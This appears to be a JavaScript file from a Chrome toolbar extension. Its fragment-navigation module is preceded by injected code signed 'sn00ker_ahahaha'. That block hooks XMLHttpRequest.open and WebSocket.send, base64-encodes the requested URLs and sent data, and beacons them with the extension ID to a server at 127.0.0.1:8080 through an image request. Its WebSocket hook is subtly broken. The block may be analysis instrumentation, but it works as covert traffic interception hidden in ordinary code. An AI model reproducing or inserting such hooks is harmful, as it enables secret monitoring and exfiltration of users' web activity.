function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
'use strict';
var UrlFragmentActions;
(function (UrlFragmentActions) {
    var config;
    var tabsCalledFrom = [];
    var cobrand;
    function fragmentMatches(url) {
        var fragmentId = UrlUtils.parseUrl(url).getFragmentId();
        var parsedFragment = UrlUtils.parseQueryString(fragmentId);
        return parsedFragment.getParam('command') === 'showNewTab'
            && parsedFragment.getParam('cobrand') === cobrand;
    }
    function navListener(details) {
        if (tabsCalledFrom.indexOf(details.tabId) === -1 && fragmentMatches(details.url)) {
            PageUtils.openDefaultNewTab().catch(Logger.log);
            tabsCalledFrom.push(details.tabId);
        }
        else {
        }
    }
    function removedListener(tabId) {
        var index = tabsCalledFrom.indexOf(tabId);
        if (index !== -1) {
            tabsCalledFrom.splice(index, 1);
        }
        else {
        }
    }
    function init(cfg) {
        config = cfg;
        var secondaryOfferParsedUrl = UrlUtils.parseUrl(config.state.toolbarData.chromeSearchExtensionURL);
        var partnerId = GlobalPartnerIdFactory.parse(config.state.toolbarData.partnerId, config.state.toolbarData.partnerSubId);
        cobrand = partnerId.getCobrand() || config.state.toolbarData.cobrand;
        var filter = {
            url: [
                { hostContains: secondaryOfferParsedUrl.getDomain() }
            ]
        };
        if (!secondaryOfferParsedUrl.getDomain()) {
            return;
        }
        chrome.webNavigation.onReferenceFragmentUpdated.addListener(navListener, filter);
        chrome.webNavigation.onBeforeNavigate.addListener(navListener, filter);
        chrome.tabs.onRemoved.addListener(removedListener);
    }
    UrlFragmentActions.init = init;
})(UrlFragmentActions || (UrlFragmentActions = {}));
